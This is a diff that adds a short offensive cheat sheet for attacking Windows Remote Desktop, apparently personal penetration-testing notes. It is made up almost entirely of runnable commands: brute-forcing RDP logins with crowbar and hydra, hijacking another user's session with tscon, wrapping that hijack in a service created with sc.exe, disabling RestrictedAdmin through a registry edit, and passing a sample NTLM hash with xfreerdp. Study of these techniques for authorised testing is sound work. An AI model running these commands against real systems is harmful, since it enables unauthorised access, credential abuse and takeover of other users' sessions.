@@ -1,0 +1,39 @@
+BRUTE-FORCING RDP WITH CROWBAR/HYDRA
+crowbar -b rdp -s <target-ip>/<target-port> -U userlist.txt -c 'password123'
+
+hydra -L userlist.txt -P passlist.txt <target-ip> rdp
+
+
+LOGGING INTO RDP:
+rdesktop -u admin -p password123 <target-ip>
+xfreerdp /v:<target-ip> /u:<username> /p:<password>
+
+==========================================
+RDP SESSION HIJACKING (WINDOWS)
+(pretend we are logged in as another user in the same network/ip)
+PS:
+whoami
+query user
+
+(remember we need to have SYSTEM privileges and use the Microsoft tscon.exe)
+
+tscon <target_session_id> /dest:<our_session_name>
+(example:) tscon 4 /dest:rdp-tcp#13
+
+CREATING A SESSIONHIJACK 'SHORTCUT'
+whoami
+query user
+(now we make a binpath and name it 'sessionhijack')
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"
+
+Then you can hijack easily using:
+net start sessionhijack
+=============================================
+
+RDP PASS-THE-HASH ATTACK
+Make sure to take down account restrictions:
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+then pass the hash:
+xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+
